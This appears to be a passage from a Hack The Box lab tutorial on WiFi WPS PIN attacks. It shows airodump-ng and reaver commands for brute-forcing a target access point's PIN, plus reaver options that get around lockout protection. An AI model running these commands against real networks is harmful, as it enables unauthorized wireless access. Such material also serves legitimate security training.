```sh
3kjS@htb[/htb]$ iw dev wlan0 interface add mon0 type monitor

3kjS@htb[/htb]$ ifconfig mon0 up

3kjS@htb[/htb]$ iwconfig

lo        no wireless extensions.

eth0      no wireless extensions.

mon0      IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on
```

Then, we can use `airodump-ng` to continuously scan for the WPS status of nearby networks.

```sh
3kjS@htb[/htb]$ airodump-ng mon0 --wps -c 1        
```

In a new terminal, we can start the bruteforce attempt on the available WiFi network.

```sh
3kjS@htb[/htb]$ reaver -i mon0 -c 1 -b 86:53:10:C3:1B:26 -v
```
![](Screenshot%202026-09-21%20at%2008.52.32.png)

After three incorrect attempts, the AP will enter a `Locked` state for `60 seconds`. Each subsequent wrong PIN attempt will cause the AP to lock for another 60 seconds. However, after 10 incorrect attempts, the AP will lock for `365 days`.

We can observe in the `airodump-ng` output that the access point goes into a `Locked` state.

```sh
3kjS@htb[/htb]$ airodump-ng mon0 --wps -c 1
```
![](Screenshot%202026-09-21%20at%2008.52.53.png)

|**Option**|**Description**|
|---|---|
|`-L, --ignore-locks`|Ignore locked state reported by the target AP|
|`-N, --no-nacks`|Do not send NACK messages when out of order packets are received|
|`-d, --delay=<seconds>`|Set the delay between pin attempts 1|
|`-T, --m57-timeout=<seconds>`|Set the M5/M7 timeout period 0.40|
|`-r, --recurring-delay=<x:y>`|Sleep for y seconds every x pin attempts|

```sh
3kjS@htb[/htb]$ reaver -i mon0 -c 1 -b 86:53:10:C3:1B:26 -v
```
![](Screenshot%202026-09-21%20at%2008.53.54.png)
